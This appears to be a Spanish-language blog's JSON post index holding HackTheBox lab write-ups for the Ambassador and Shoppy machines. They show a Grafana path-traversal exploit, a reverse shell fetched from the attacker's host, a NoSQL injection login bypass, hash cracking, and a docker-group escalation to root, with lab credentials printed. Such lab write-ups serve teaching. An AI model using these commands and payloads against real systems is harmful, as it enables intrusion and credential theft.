[
  
  {
    "title": "Precious WriteUp",
    "url": "/posts/precious-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "hackthebox, writeup, rce",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicaré comó comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID."
  },
  
  {
    "title": "Ambassador WriteUp",
    "url": "/posts/ambassador-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "hackthebox, writeup, grafana, directoty transversal, arbitrary file read",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicare como comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con una vulnerabilidad de tipo Directory Transversal y Arbitrary File Read. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos permitira descargar la base de datos y poder ver la contraseña de un usuario y para la escalada usaremos un script de privilegios usaremos nos aprovecharemos de en exploit de Consul con un token que nos lanzará la shell como root.Escaneo NMAPEmpezamos enumerando con NMAP, con ello encontaremos los puertos abiertos y los servicios que se exponen.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04Initiating SYN Stealth Scan at 00:03Scanning 10.10.11.183 [65535 ports]Discovered open port 80/tcp on 10.10.11.183Discovered open port 3306/tcp on 10.10.11.183Discovered open port 22/tcp on 10.10.11.183Discovered open port 3000/tcp on 10.10.11.183Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports)Nmap scan report for 10.10.11.183Host is up, received user-set (0.32s latency).Scanned at 2023-01-21 00:03:39 -04 for 17sNot shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 633000/tcp open  ppp     syn-ack ttl 633306/tcp open  mysql   syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 17.22 seconds           Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB)Puerto 22 su servicio por defecto es SSH, 80 este puerto en su configuración por defecto corre el servicio HTTP, MySQL corre en el puerto 3306 y el puerto 3000 fue asignado por el administradorEnumeraciónPodemos realizar FUZZING para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encontramos y tratar de acceder a él.Viendo la web nos encontramos con esto:Grafana LoginViendo en la parte inferior nos da información acerca de la versión, usando searchsploit nos damos cuenta de que cuenta con estas vulnerabilidades Directory Traversal and Arbitrary File ReadSearchsploitPodemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el /etc/passwd❯ searchsploit -m multiple/webapps/50581.py  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read      URL: https://www.exploit-db.com/exploits/50581     Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py    Codes: CVE-2021-43798 Verified: FalseFile Type: Python script, ASCII text executableCopied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.pyLa ejecutamos…SearchsploitBuscando en internet acerca de este CVE nos encontramos con este blog, nos enseñan a explotarlo de forma manual.❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashdeveloper:x:1000:1000:developer:/home/developer:/bin/bashSi seguimos leyendo podemos ver que nos podemos descargar la base de datos curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.dbAhora procedemos a leer la base de datos, para ello debes tener instalado sqlite3 para verlo desde consola, ya que lo considero mas fácil.  sudo apt install sqlite3Sigueindo las instrucciones del blog leemos la base de datos. sqlite3 grafana.bdUna vez detro de la base de datos, procedemos a leer las tablas ❯ sqlite3 grafana.dbSQLite version 3.34.1 2021-01-20 14:10:07Enter \".help\" for usage hints.sqlite&gt; .tablesalert                       login_attempt             alert_configuration         migration_log             alert_instance              ngalert_configuration     alert_notification          org                       alert_notification_state    org_user                  alert_rule                  playlist                  alert_rule_tag              playlist_item             alert_rule_version          plugin_setting            annotation                  preferences               annotation_tag              quota                     api_key                     server_lock               cache_data                  session                   dashboard                   short_url                 dashboard_acl               star                      dashboard_provisioning      tag                       dashboard_snapshot          team                      dashboard_tag               team_member               dashboard_version           temp_user                 data_source                 test_data                 kv_store                    user                      library_element             user_auth                 library_element_connection  user_auth_token           sqlite&gt; Usando una query de SQL, leeremos las columnas de la tabla data_source.select * from data_source;Veremos algo cómo esto.sqlite&gt; SELECT * FROM data_source;2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4zsqlite&gt; Ganamos accesoDonde el parámetro -h corresponde al host -u  al user -p a la contraseñaAhora nos podemos conectar a MySQL debido a que conocemos el user y su contraseña.❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MySQL connection id is 47Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| grafana            || information_schema || mysql              || performance_schema || sys                || whackywidget       |+--------------------+6 rows in set (0,172 sec)MySQL [(none)]&gt; use whackywidget;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMySQL [whackywidget]&gt; show tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users                  |+------------------------+1 row in set (0,396 sec)MySQL [whackywidget]&gt; SELECT * FROM users;+-----------+------------------------------------------+| user      | pass                                     |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+1 row in set (0,375 sec)MySQL [whackywidget]&gt; Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera.echo \"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==\" | base64 -d;echo anEnglishManInNewYork027468Con esas credenciales podemos conectarnos por SSH.❯ ssh developer@10.10.11.183The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.183' (ECDSA) to the list of known hosts.developer@10.10.11.183's password: anEnglishManInNewYork027468 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat 21 Jan 2023 05:10:23 AM UTC  System load:  0.0               Processes:             229  Usage of /:   84.4% of 5.07GB   Users logged in:       0  Memory usage: 49%               IPv4 address for eth0: 10.10.11.183  Swap usage:   0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sat Jan 21 00:27:29 2023 from 10.10.14.105developer@ambassador:~$ export TERM=xtermdeveloper@ambassador:~$ Podemos leer la primara flag.developer@ambassador:~$ cat user.txt 565**************************1b5developer@ambassador:~$ Enumeración del sistemaSi nos situamos en la carpeta /opt podemos ver un proyecto de github.developer@ambassador:/opt/my-app$ ls -a.  ..  .git  .gitignore  env  whackywidgetdeveloper@ambassador:/opt/my-app$ Si hacemos un git -log podemos ver los últimos commits que se aplicarondeveloper@ambassador:/opt/my-app$ git logcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptcommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:44:45 2022 +0000    config scriptcommit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:47:01 2022 +0000    created project with django CLIcommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:44:11 2022 +0000    .gitignoredeveloper@ambassador:/opt/my-app$ Ahora haciendo un git show se nos mostrará información acerca de ese commit.developer@ambassador:/opt/my-app$ git showcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptdiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.shindex 35c08f6..fc51ec0 100755--- a/whackywidget/put-config-in-consul.sh+++ b/whackywidget/put-config-in-consul.sh@@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app-# Export MYSQL_PASSWORD before running+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORDdeveloper@ambassador:/opt/my-app$ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios.Escalada de privilegiosUsando el exploit de GatoGamer podemos elevar nuestros privilegios, nos descargamos el repositorio de GitHub, nos montamos un servidor HTTP con Pythonpython -m http.server 80En la máquina victima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.developer@ambassador:~$ wget http://10.10.14.61/exploit.py--2023-01-21 05:40:22--  http://10.10.14.61/exploit.pyConnecting to 10.10.14.61:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1409 (1.4K) [text/x-python]Saving to: ‘exploit.py.1’exploit.py.1                                  100%[=================================================================================================&gt;]   1.38K  --.-KB/s    in 0s      2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409]developer@ambassador:~$ En la máquina victima ejecutamos lo siguiente.Nota: Recuerda cambiar tu IP de HTBEn nuestra máquina host nos ponemos en escuchadeveloper@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 ❯ nc -nlvp 123listening on [any] 123 ...Al ejecutarlo nos debe llegar la shell como root❯ nc -nlvp 123listening on [any] 123 ...connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732bash: cannot set terminal process group (3731): Inappropriate ioctl for devicebash: no job control in this shellroot@ambassador:/# Ahora podemos vizualizar la flag como rootroot@ambassador:~# lscleanup.sh  root.txt  snaproot@ambassador:~# cat root.txt 5a4**************************4b1root@ambassador:~# "
  },
  
  {
    "title": "Shoppy WriteUp",
    "url": "/posts/shoppy-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "hackthebox, writeup, no sql",
    "date": "2023-01-13 17:00:00 +0100",
    





    "snippet": "Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker.Escaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04Initiating SYN Stealth Scan at 11:59Scanning 10.10.11.180 [65535 ports]Discovered open port 80/tcp on 10.10.11.180Discovered open port 22/tcp on 10.10.11.180Discovered open port 9093/tcp on 10.10.11.180Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports)Nmap scan report for 10.10.11.180Host is up, received user-set (0.16s latency).Scanned at 2023-01-15 11:59:53 -04 for 16sNot shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 639093/tcp open  copycat syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.33 seconds           Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.180       shoppy.htb\" | tee -a /etc/hostsAhora debemos ver una web con una cuenta regresiva, nada importanteEnumeraciónEnumerando directorios con WFUZZ nos encontramos lo siguiente.Nota: Debes tener clonado el repositorio de SecList❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ  2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://shoppy.htb/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000053:   200        25 L     62 W       1074 Ch     \"login\"                                                                                                                000000016:   301        10 L     16 W       179 Ch      \"images\"                                                                                                               000000291:   301        10 L     16 W       179 Ch      \"assets\"                                                                                                               000000259:   302        0 L      4 W        28 Ch       \"admin\"   Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque.Login ShoppyIntroducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble.Login ShoppyPodemos seguir probando tipicas SQL injection, pero al final ninguna funcionará.''-- -' or '1'='1' or '1'='1'-- -Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y  este otro blog No SQl injection.Podemos probar admin'||'1==1 y poner cualquier contraseña:Bypass LoginBingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con johnecho \"admin:23c6877d9e2b564ef8b32c3a23de27b2\" &gt; hashesecho \"josh:6ebcea65320589ca4f2f1ce039975995\" &gt;&gt; hashes❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5Using default input encoding: UTF-8Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=8Press 'q' or Ctrl-C to abort, almost any other key for statusremembermethisway (josh)1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s  fuckyooh21..*7¡Vamos!Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliablySession completedTenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos❯ gobuster vhost  -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:          http://shoppy.htb/[+] Method:       GET[+] Threads:      200[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt[+] User Agent:   gobuster/3.1.0[+] Timeout:      10s===============================================================2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode===============================================================Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]Progress: 52985 / 100001 (52.98%)    Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts.Al entrar en el web nos encontramos con estoLogin MattermostViendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos.Information leaked❯ ssh jaeger@10.10.11.180jaeger@10.10.11.180's password: Sh0ppyBest@pp!Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26manpath: can't set the locale; make sure $LC_* and $LANG are correctjaeger@shoppy:~$ export TERM=xtermjaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable.Enumeración del sistemajaeger@shoppy:~$ sudo -l[sudo] password for jaeger: Sh0ppyBest@pp!Matching Defaults entries for jaeger on shoppy:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy:    (deploy) /home/deploy/password-managerjaeger@shoppy:~$ Intentamos ejecutar el comandojaeger@shoppy:~$ sudo -u deploy /home/deploy/passw*Welcome to Josh password manager!Please enter your master password: PasswordAccess denied! This incident will be reported !jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deployPassword-Managerjaeger@shoppy:~$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !Deploy Creds :username: deploypassword: Deploying@pp!jaeger@shoppy:~$ Podemos migrar al usuario Deploy .jaeger@shoppy:~$ su deployPassword: Deploying@pp!$ bashdeploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)deploy@shoppy:/home/jaeger$ Escalada de privilegiosPertenecemos al grupo docker  mirando GtfObins podemos ver que podemos abusar del grupo dockerEjecutamos el comando nos da una shell como root. deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bashroot@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las  flags respectivas para cada usuario.root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67root@3ea87a82734f:~# "
  }
  
]

